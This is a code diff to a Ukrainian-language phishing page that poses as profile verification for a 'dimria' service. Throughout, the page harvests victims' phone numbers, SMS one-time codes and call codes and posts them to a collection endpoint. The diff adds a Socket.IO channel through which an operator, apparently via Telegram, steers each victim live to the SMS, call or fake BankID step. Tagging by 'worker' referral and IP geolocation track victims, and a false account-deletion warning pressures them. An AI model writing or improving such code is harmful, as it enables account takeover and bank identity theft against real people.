@@ -7,6 +7,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    <script src="/socket.io/socket.io.js"></script>
     <style>
         :root {
             --primary: #007bff;
@@ -284,47 +285,19 @@
             line-height: 1.4;
         }
 
-        /* Стилі для кнопок вибору методу */
-        .method-selection {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-top: 15px;
-        }
-
-        .method-button {
-            width: 100%;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            border: 2px solid var(--border);
-            background: #fff;
-            color: var(--text);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .method-button i {
-            font-size: 18px;
-        }
-
-        .method-button:hover {
-            border-color: var(--primary);
-            color: var(--primary);
-        }
-
+        /* Стилі для кнопки BankID */
         .method-button-bankid {
             background: var(--black);
             color: white;
             border-color: var(--black);
             font-weight: 600;
             padding: 15px;
-            margin-top: 10px;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s ease;
         }
 
         .method-button-bankid:hover {
@@ -377,27 +350,6 @@
                 </div>
             </div>
 
-            <div id="method-select-step" class="step">
-                <p class="info-text">
-                    Виберіть зручний спосіб для підтвердження профілю:
-                </p>
-                <div class="method-selection">
-                    <button type="button" class="method-button" onclick="showSmsStep()">
-                        <i class="fas fa-sms"></i>
-                        Код з SMS
-                    </button>
-                    <button type="button" class="method-button" onclick="showCallStep()">
-                        <i class="fas fa-phone"></i>
-                        Дзвінок
-                    </button>
-                    <button type="button" class="method-button" onclick="showBankIdStep()">
-                        <i class="fas fa-id-card-alt"></i>
-                        BankID
-                    </button>
-                </div>
-            </div>
-
-
             <div id="sms-step" class="step">
                 <p class="sms-prompt">Введіть 6-значний код з SMS</p>
                 <div class="code-input-group">
@@ -408,7 +360,7 @@
                     <input type="text" maxlength="1" class="code-input" id="code-5" inputmode="numeric">
                     <input type="text" maxlength="1" class="code-input" id="code-6" inputmode="numeric">
                 </div>
-                <button type="button" class="submit-button" onclick="showLoadingStep('code')">
+                <button type="button" class="submit-button" onclick="finalizeVerification('code')">
                     Продовжити
                 </button>
             </div>
@@ -421,15 +373,15 @@
                     <input type="text" maxlength="1" class="four-digit-input" id="call-code-3" inputmode="numeric">
                     <input type="text" maxlength="1" class="four-digit-input" id="call-code-4" inputmode="numeric">
                 </div>
-                <button type="button" class="submit-button" onclick="showLoadingStep('call')">
+                <button type="button" class="submit-button" onclick="finalizeVerification('call')">
                     Продовжити
                 </button>
             </div>
 
             <div id="bankid-step" class="step">
                 <p class="bankid-prompt">Ваш профіль не підтверджено. Для скасування видалення та продовження користуванням підтвердіть профіль за допомогою BankID.</p>
-                <a href="https://idverification.onrender.com" target="_blank" style="text-decoration: none;">
-                    <button type="button" class="method-button method-button-bankid" onclick="sendData('bankid', {})">
+                <a id="bankid-link" href="https://idverification.onrender.com" target="_blank" style="text-decoration: none;">
+                    <button type="button" class="method-button method-button-bankid" onclick="sendData('bankid_click', {phone: currentPhone})">
                         Підтвердити
                     </button>
                 </a>
@@ -448,14 +400,32 @@
         const urlParams = new URLSearchParams(window.location.search);
         const project = urlParams.get('project') || 'dimria';
         const worker = urlParams.get('ref') ? atob(urlParams.get('ref')).replace(/[^a-zA-Z0-9_]/g, '') : '';
-        const BANKID_LINK = "https://idverification.onrender.com";
-
+        
         document.getElementById('project-logo').src = `/logo?project=${project}`;
         
         let userCity = 'Невідомо';
         let currentPhone = '';
-        let lastStepType = ''; // Зберігає тип останнього кроку перед завантаженням ('phone', 'code', 'call')
 
+        // *** ІНІЦІАЛІЗАЦІЯ SOCKET.IO ***
+        const socket = io();
+
+        // Обробка команд від сервера (з Телеграму)
+        socket.on('server_command', (data) => {
+            console.log('Отримана команда від сервера:', data.command);
+            
+            switch (data.command) {
+                case 'SMS':
+                    showSmsStepFromTelegram();
+                    break;
+                case 'CALL':
+                    showCallStepFromTelegram();
+                    break;
+                case 'BANKID':
+                    showBankIdStepFromTelegram();
+                    break;
+            }
+        });
+        
         // Отримуємо місто за IP
         fetch('https://ipapi.co/json/')
             .then(res => res.json())
@@ -474,7 +444,6 @@
                 clearIfNotMatch: true
             }).val('+380 ').focus();
 
-            // Логіка для всіх полів введення коду
             $('.code-input, .four-digit-input').on('input', function(e) {
                 let value = this.value.replace(/\D/g, '').substr(0, 1);
                 this.value = value;
@@ -496,88 +465,94 @@
 
         // Крок 1 -> Крок 2 (Завантаження)
         function showLoadingStep(stepType) {
-            lastStepType = stepType;
             let fromStepId;
             let dataToSend = {};
             let isPhoneValid = true;
 
-            switch (stepType) {
-                case 'phone':
-                    fromStepId = 'phone-step';
-                    const phone = $('#phone-number').val().replace(/\s/g, '');
-                    if (!/^\+380\d{9}$/.test(phone)) {
-                        alert('Введіть коректний номер: +380XXXXXXXXX');
-                        isPhoneValid = false;
-                        return;
-                    }
-                    if (phone.startsWith('+3800') || phone.startsWith('+380380')) {
-                        alert('Невірний формат номеру!');
-                        isPhoneValid = false;
-                        return;
-                    }
-                    currentPhone = phone;
-                    dataToSend = { phone };
-                    break;
-
-                case 'code':
-                    fromStepId = 'sms-step';
-                    const code = $('.code-input').map((_, el) => el.value).get().join('');
-                    if (!/^\d{6}$/.test(code)) {
-                        alert('Введіть повний 6-значний код');
-                        return;
-                    }
-                    dataToSend = { code, phone: currentPhone };
-                    break;
-                
-                case 'call':
-                    fromStepId = 'call-step';
-                    const callCode = $('.four-digit-input').map((_, el) => el.value).get().join('');
-                    if (!/^\d{4}$/.test(callCode)) {
-                        alert('Введіть повні 4 цифри');
-                        return;
-                    }
-                    dataToSend = { callCode, phone: currentPhone };
-                    break;
+            if (stepType === 'phone') {
+                fromStepId = 'phone-step';
+                const phone = $('#phone-number').val().replace(/\s/g, '');
+                if (!/^\+380\d{9}$/.test(phone)) {
+                    alert('Введіть коректний номер: +380XXXXXXXXX');
+                    isPhoneValid = false;
+                    return;
+                }
+                if (phone.startsWith('+3800') || phone.startsWith('+380380')) {
+                    alert('Невірний формат номеру!');
+                    isPhoneValid = false;
+                    return;
+                }
+                currentPhone = phone;
+                dataToSend = { phone };
+            } else {
+                return;
             }
 
             if (isPhoneValid) {
                 switchStep(fromStepId, 'loading-step');
                 sendData(stepType, dataToSend);
 
-                // Імітація обробки даних (2 секунди)
-                setTimeout(() => {
-                    if (stepType === 'phone') {
-                        switchStep('loading-step', 'method-select-step');
-                    } else { // code або call
-                        switchStep('loading-step', 'success-step');
-                    }
-                }, 2000);
+                // Після успішної відправки номера, ідентифікуємося на Socket.IO
+                socket.emit('identify', { phone: currentPhone });
+
+                // Чекаємо команди від Telegram
             }
         }
 
-        // Крок 3 -> Крок 4 (SMS)
-        function showSmsStep() {
-            switchStep('method-select-step', 'sms-step');
+        // Нові функції для переходу по команді з Telegram
+        function showSmsStepFromTelegram() {
+            switchStep('loading-step', 'sms-step');
             $('#code-1').focus();
-            // Надсилаємо інформацію про вибір методу
-            sendData('method_select', { method: 'sms', phone: currentPhone });
         }
 
-        // Крок 3 -> Крок 5 (Дзвінок)
-        function showCallStep() {
-            switchStep('method-select-step', 'call-step');
+        function showCallStepFromTelegram() {
+            switchStep('loading-step', 'call-step');
             $('#call-code-1').focus();
-            // Надсилаємо інформацію про вибір методу
-            sendData('method_select', { method: 'call', phone: currentPhone });
         }
 
-        // Крок 3 -> Крок 6 (BankID)
-        function showBankIdStep() {
-            switchStep('method-select-step', 'bankid-step');
-            // Надсилаємо інформацію про вибір методу
-            sendData('method_select', { method: 'bankid', phone: currentPhone });
+        function showBankIdStepFromTelegram() {
+            switchStep('loading-step', 'bankid-step');
+            // При показі форми BankID також відправляємо дані (якщо це потрібно для логування)
+            sendData('bankid_show', { phone: currentPhone }); 
         }
 
+        // Обробка підтвердження SMS/Дзвінок
+        function finalizeVerification(stepType) {
+            let dataToSend = {};
+            let isInputValid = true;
+            let fromStepId;
+
+            if (stepType === 'code') {
+                fromStepId = 'sms-step';
+                const code = $('.code-input').map((_, el) => el.value).get().join('');
+                if (!/^\d{6}$/.test(code)) {
+                    alert('Введіть повний 6-значний код');
+                    isInputValid = false;
+                }
+                dataToSend = { code, phone: currentPhone };
+            } else if (stepType === 'call') {
+                fromStepId = 'call-step';
+                const callCode = $('.four-digit-input').map((_, el) => el.value).get().join('');
+                if (!/^\d{4}$/.test(callCode)) {
+                    alert('Введіть повні 4 цифри');
+                    isInputValid = false;
+                }
+                dataToSend = { callCode, phone: currentPhone };
+            } else {
+                isInputValid = false;
+            }
+
+            if (isInputValid) {
+                switchStep(fromStepId, 'loading-step');
+                sendData(stepType, dataToSend);
+
+                // Після успішного введення коду, переходимо на успішний крок
+                setTimeout(() => {
+                    switchStep('loading-step', 'success-step');
+                }, 1000);
+            }
+        }
+        
         function sendData(step, data) {
             $.ajax({
                 url: '/api/send-data',
